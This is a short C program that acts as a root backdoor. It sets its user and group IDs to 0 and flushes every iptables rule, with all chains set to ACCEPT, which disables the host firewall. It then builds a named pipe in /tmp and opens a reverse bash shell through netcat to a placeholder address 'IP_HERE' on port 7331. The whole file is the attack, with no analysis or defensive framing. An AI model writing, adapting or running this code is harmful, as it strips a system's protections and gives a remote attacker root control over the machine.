#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

	setuid(0);
	setgid(0);

	system("iptables -F");
	system("iptables -t mangle -F");

	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");

	system("[ ! -p /tmp/asdcoij ] && mkfifo /tmp/asdcoij");
	system("(/bin/bash 0</tmp/asdcoij | nc IP_HERE 7331 1>/tmp/asdcoij) &");

	return 0;
}
